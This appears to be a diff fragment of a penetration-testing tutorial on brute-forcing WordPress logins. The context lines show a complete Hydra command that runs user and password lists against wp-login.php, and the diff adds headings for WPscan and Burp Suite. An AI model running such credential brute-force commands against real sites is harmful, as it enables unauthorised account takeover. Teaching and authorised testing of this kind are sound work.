@@ -39,3 +39,5 @@ Start your terminal and enter the following command:
 hydra 192.168.10.10 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt 
 
 Now the tool will try each and every username/password combination on the webform until it finds a valid one.  
+## WPscan
+## Burpsuit
